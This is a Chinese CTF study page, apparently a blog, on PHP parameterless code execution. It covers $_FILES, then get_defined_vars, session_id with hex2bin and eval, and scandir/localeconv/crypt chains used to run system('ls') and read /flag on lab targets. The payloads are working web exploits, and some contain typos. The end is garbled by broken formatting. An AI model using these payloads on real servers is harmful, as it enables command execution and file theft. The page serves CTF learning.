<p>当你使用 <code>&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</code> 上传文件时：</p>
<p>你表单中形如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当用户提交这个表单并上传文件后，PHP 会自动将上传的文件信息存放在 <code>$_FILES</code> 数组中。</p>
<hr>
<p><code>$_FILES</code> 的结构示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [upload] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; example.png</span><br><span class="line">            [type] =&gt; image/png</span><br><span class="line">            [tmp_name] =&gt; /tmp/phpYzdqkD</span><br><span class="line">            [error] =&gt; <span class="number">0</span></span><br><span class="line">            [size] =&gt; <span class="number">12345</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>字段说明：</p>
<ul>
<li><code>name</code>: 上传文件的原始名称。</li>
<li><code>type</code>: MIME 类型。</li>
<li><code>tmp_name</code>: 临时文件在服务器上的路径（存储在 PHP 的临时目录中）。</li>
<li><code>error</code>: 错误代码（0 表示上传成功）。</li>
<li><code>size</code>: 文件大小（单位：字节）。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(pos(get_defined_vars()));&amp;cmd=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423195336637.png" alt="image-20250423195336637"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(end(pos(get_defined_vars())));&amp;cmd=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423195354834.png" alt="image-20250423195354834"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=assert(end(pos(get_defined_vars())));&amp;cmd=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>

<p>把print_r换成eval、assert即可执行命令system(‘ls’);</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423195430751.png" alt="image-20250423195430751"></p>
<h2 id="0x18无参数session-RCE"><a href="#0x18无参数session-RCE" class="headerlink" title="0x18无参数session RCE"></a>0x18无参数session RCE</h2><h3 id="利用session-php5"><a href="#利用session-php5" class="headerlink" title="利用session(php5)"></a><strong>利用session(php5)</strong></h3><p>session_start()</p>
<p>启动新会话或者重用现有会话，成功开始会返回TRUE，反之返回FALSE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(session_start());</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423195814031.png" alt="image-20250423195814031"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>返回PHPSESSID的值</p>
<p>可以使用burpsuite修改PHPSESSID的值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423200221727.png" alt="image-20250423200221727"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>print_r修改为show_source()</p>
<p>用burpsuite修改PHPSESSID的值为.&#x2F;flag</p>
<p>用show_source读取flag文件源代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423200416773.png" alt="image-20250423200416773"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>修改外部函数eval()</p>
<p>修改PHPSESSID的值为命令’phpinfo();’</p>
<p>无法直接执行  因为PHPSESSID的值里不能一些有特殊符号</p>
<p>先把命令’phpinfo();’HEX编码转为十六进制，写入PHPSESSID</p>
<p>再用hex2bin()函数将十六进制转换为二进制（原始）数据，用eval执行</p>
<p>PHPSESSID&#x3D;706870696e666f28293b</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423200940153.png" alt="image-20250423200940153"></p>
<p><strong>但是TGCTF2025里有一道题（ AAA偷渡阴平（复仇））  session_start()的用法不一样   复现平台在<a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/">https://ctf.xidian.edu.cn/</a></strong></p>
<h3 id="AAA偷渡阴平（复仇）与本靶场的比较"><a href="#AAA偷渡阴平（复仇）与本靶场的比较" class="headerlink" title="AAA偷渡阴平（复仇）与本靶场的比较"></a>AAA偷渡阴平（复仇）与本靶场的比较</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423202321836.png" alt="image-20250423202321836"></p>
<p>这个是上面靶场的题</p>
<p>执行session_start();system(hex2bin(session_id(session_start()))); 是没有正常执行的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423202348671.png" alt="image-20250423202348671"></p>
<p>这是TGCTF的题执行session_start();system(hex2bin(session_id())); 是正常执行的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(hex2bin(session_id(session_start()))); </span><br></pre></td></tr></table></figure>

<p>而上面靶场的题执行这个是可以成功执行的   TGCTF的题不可以</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423202525757.png" alt="image-20250423202525757"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423202533828.png" alt="image-20250423202533828"></p>
<p>然后在上面靶场的php7环境下试了一下TGCTF的payload仍然没有反应  当然这个靶场里原来php5环境里可以用的payload也不可以用</p>
<p>具体不知道是什么环境问题</p>
<h2 id="0x19无参数scandir读取"><a href="#0x19无参数scandir读取" class="headerlink" title="0x19无参数scandir读取"></a>0x19无参数scandir读取</h2><p><strong>利用scandir()进行文件读取</strong>   （只能进行文件读取）</p>
<h3 id="当前目录"><a href="#当前目录" class="headerlink" title="当前目录"></a>当前目录</h3><h4 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a><strong>scandir()</strong></h4><p>类似ls，在某文件路径下，把内容以列表形式显示出来</p>
<ul>
<li>scandir()——列出指定路径中的文件和目录(php5,7,8)</li>
<li>getcwd()——取得当前工作目录(php4,5,7,8)</li>
<li>current()——返回数组中的第一项的值(php4,5,7,8)</li>
<li>array_reverse()——返回单元顺序相反的数组(php4,5,7,8)</li>
<li>array_flip()——交换数组中的键和值(php4,5,7,8)</li>
<li>next()——将数组中的内部指针向前移动（其实就是到了数组里的下一个键和值）</li>
<li>array_rand()——从数组中随机取出一个或多个随机键</li>
<li>chdir()——系统调用函数(同cd)，用于改变当前工作目录</li>
<li>strrev()——用于反转给定的字符串</li>
<li>crypt()——用来加密，目前Linux平台上加密的方法大致有MD5,DES,3 DES</li>
<li>hebrevc()——把希伯来文本从右至左的流转换为从左至右的流</li>
</ul>
<p>查看当前目录文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(localeconv());</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423205419114.png" alt="image-20250423205419114"></p>
<p>localeconv();显示的数组第一项为”.”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(current(localeconv()));</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423205607725.png" alt="image-20250423205607725"></p>
<p>current()功能同pos()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423205937869.png" alt="image-20250423205937869"></p>
<p>scandir()读取当前目录”.”下所有文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>

<p>倒序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423210537457.png" alt="image-20250423210537457"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(current(array_reverse(scandir(current(localeconv)))));</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423211103165.png" alt="image-20250423211103165"></p>
<p>读取当前目录文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(current(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423211307372.png" alt="image-20250423211307372"></p>
<h4 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd"></a>getcwd</h4><p>查看和读取当前目录文件   getcwd()当前目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(getcwd());</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423211426813.png" alt="image-20250423211426813"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(getcwd()));</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423211535294.png" alt="image-20250423211535294"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(end(scandir(getcwd())));</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423211631665.png" alt="image-20250423211631665"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(end(scandir(getcwd())));</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423211708274.png" alt="image-20250423211708274"></p>
<h3 id="上级目录"><a href="#上级目录" class="headerlink" title="上级目录"></a>上级目录</h3><p>查看上一级目录文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(getcwd());</span><br></pre></td></tr></table></figure>

<p>getcwd()当前目录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423212055150.png" alt="image-20250423212055150"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(dirname(getcwd()));</span><br></pre></td></tr></table></figure>

<p>dirname()上一级目录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423212046698.png" alt="image-20250423212046698"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(dirname(getcwd())));</span><br></pre></td></tr></table></figure>

<p>查看上一级目录文件名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423212133738.png" alt="image-20250423212133738"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(next(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<p>效果相同    因为第二个元素是  ..   也是上级目录的意思</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250423212356787.png" alt="image-20250423212356787"></p>
<p>读取上一级目录文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>

<p>这会随机读取上一级目录中的一个文件的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(arry_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(arry_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrev(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure>



<h3 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(array());</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(serialize(array()));</span><br></pre></td></tr></table></figure>

<p>serialize序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(crypt(serialize(array())));</span><br></pre></td></tr></table></figure>

<p>末尾可能出现    &#x2F;</p>
<p>crypt单向字符串散列加密，结果随机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(strrev(crypt(serialize(array()))));</span><br></pre></td></tr></table></figure>

<p>反转  让开头可能出现  &#x2F;</p>
<p>strrev  倒序</p>
<p>ord()函数和chr()函数</p>
<p>只能对第一个字符进行转码   ord()编码   chr()解码</p>
<p><code>ord(x)</code>：把<strong>单个字符</strong>变成<strong>Unicode码点</strong>（整数）  在下面paylaod这里  他只能取第一个字符</p>
<p><code>chr(x)</code>：把<strong>整数</strong>变成对应的<strong>字符</strong>       所以就有可能通过ord()  将  &#x2F;  编码  再通过chr()解码   来得到  &#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(chr(ord(strrev(crypt(serialize(array()))))));</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427195127591.png" alt="image-20250427195127591"></p>
<p>scandir  列出根目录中的文件和目录   查看根目录文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array()))))));</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427195513499.png" alt="image-20250427195513499"></p>
<p>最后通过array_flip()反转键和键值   array_rand()随机读取键    show_source()展示源码</p>
<p>?code&#x3D;show_source(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array())))))))));</p>
<p>这里还得拿chdir()把目录固定一下   dirname()取上级目录 (取目录的父级)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427201509100.png" alt="image-20250427201509100"></p>
<p>这个就是 &#x2F;flag里的内容</p>
<p>这里也可以通过burpsuite的intruder模块进行爆破无限发包访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427201615308.png" alt="image-20250427201615308"></p>
<h2 id="nss-Boring-Code"><a href="#nss-Boring-Code" class="headerlink" title="nss  Boring Code"></a>nss  Boring Code</h2><h2 id="获得"><a href="#获得" class="headerlink" title="获得  ."></a>获得  .</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><h4 id="切换目录层级"><a href="#切换目录层级" class="headerlink" title="切换目录层级"></a><strong>切换目录层级</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#x27;..&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>将工作目录切换到<strong>上级目录</strong>（路径向上跳一层）</li>
</ul>
<h4 id="构造根目录路径"><a href="#构造根目录路径" class="headerlink" title="构造根目录路径"></a><strong>构造根目录路径</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(pos(localtime(time())))</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>time()</code>: 获取当前时间戳（如 <code>1717047000</code>）</p>
</li>
<li><p><code>localtime()</code>: 解析为时间数组 → <code>[秒, 分, 时, ...]</code></p>
</li>
<li><p><code>pos()</code>: 取第一个元素（<strong>秒数</strong>，范围 0-59）</p>
</li>
<li><pre><code>chr()
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">: 将秒数转为ASCII字符</span><br><span class="line"></span><br><span class="line">- 若秒数=47 → ASCII 47 = **`/`**（根目录符号）</span><br><span class="line"></span><br><span class="line">#### **扫描根目录文件**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
scandir(&#39;/&#39;)
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 列出根目录所有文件 → 如 `[&quot;bin&quot;, &quot;etc&quot;, &quot;var&quot;, &quot;flag&quot;]`</span><br><span class="line"></span><br><span class="line">#### **获取目标文件**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
end(scandir(&#39;/&#39;))
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `end()`: 取数组最后一个元素 → 假设存在文件 **`flag`**（常见CTF设计）</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">#### **读取文件内容**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
readfile(&#39;/flag&#39;)
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 直接输出flag文件内容</span><br><span class="line"></span><br><span class="line">### 2</span><br><span class="line"></span><br><span class="line">### 第一阶段</span><br><span class="line"></span><br><span class="line">通过Fuzz，发现了一个file() 函数</span><br><span class="line"></span><br><span class="line">&gt; file() 函数把整个文件读入一个数组中。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 与 [file_get_contents()](https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp) 类似，不同的是 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 如果失败，则返回 false</span><br><span class="line"></span><br><span class="line">[![img](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104131334267-926601433.png)](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104131334267-926601433.png)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">既然是一个数组，我们可以用serialize序列化函数来转成一个字符串</span><br><span class="line"></span><br><span class="line">[![img](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104131432961-1833819067.png)](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104131432961-1833819067.png)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">呢么读取flag的无参数函数就有了echo(serialize(file()))</span><br><span class="line"></span><br><span class="line">### 第二阶段</span><br><span class="line"></span><br><span class="line">最重要的是.的获取，但是local和time都被ban了，该怎么获得.呢。当时比赛的时候确实没有fuzz出来，google搜到了一下大佬的骚姿势，链接会放在文章下方。</span><br><span class="line"></span><br><span class="line">#### crypt(serialize(array()));</span><br><span class="line"></span><br><span class="line">利用crypt返回一个加密的字符串，加密的字符串末尾有几率出现一个.</span><br><span class="line"></span><br><span class="line">[![img](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104132449908-1411954595.png)](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104132449908-1411954595.png)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[![img](https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250528205646341.png)](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104132530080-470690287.png)</span><br><span class="line"></span><br><span class="line">[![img](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104132541865-1235099868.png)](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104132541865-1235099868.png)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span 